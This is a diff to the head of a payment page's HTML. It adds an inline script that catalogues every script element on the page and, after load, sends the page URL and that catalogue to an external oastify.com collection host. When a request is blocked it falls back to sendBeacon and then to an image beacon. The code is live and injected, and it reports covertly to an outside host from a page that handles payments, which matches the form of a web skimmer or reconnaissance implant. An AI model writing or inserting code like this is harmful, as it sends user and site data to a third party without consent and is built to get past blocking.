@@ -1,7 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script src="https://proxy.csidetm.com/script.js"></script>
+    <script>
+const scriptMeta = new Map();
+
+function captureScript(node) {
+  if (node.nodeName === 'SCRIPT' && node.src) {
+    scriptMeta.set(node.src, {
+      url: node.src,
+      integrity: node.getAttribute('integrity') || null,
+      crossorigin: node.getAttribute('crossorigin') || null
+    });
+  }
+}
+
+// Grab what's already in DOM
+document.querySelectorAll('script[src]').forEach(s => captureScript(s));
+
+// Watch for anything injected later
+new MutationObserver(mutations => {
+  mutations.forEach(m => {
+    m.addedNodes.forEach(node => captureScript(node));
+  });
+}).observe(document.documentElement, { childList: true, subtree: true });
+
+// Beacon after page fully loads
+window.addEventListener('load', () => {
+  const payload = JSON.stringify({
+    page: window.location.href,
+    scripts: [...scriptMeta.values()],
+    ts: Date.now()
+  });
+
+  // Primary: fetch with explicit JSON content-type (respects connect-src)
+  fetch('https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: payload,
+    keepalive: true  // same as sendBeacon — survives page navigation
+  }).catch(() => {
+    // Fallback 1: sendBeacon if fetch is blocked
+    const sent = navigator.sendBeacon(
+      'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect',
+      payload
+    );
+
+    // Fallback 2: image beacon for DNS confirmation if both blocked
+    if (!sent) {
+      new Image().src = `https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect?d=${encodeURIComponent(payload)}`;
+    }
+  });
+});     
+    </script>
     <meta charset="UTF-8">
     <title>Payment Page</title>
     <link rel="stylesheet" href="style.css">
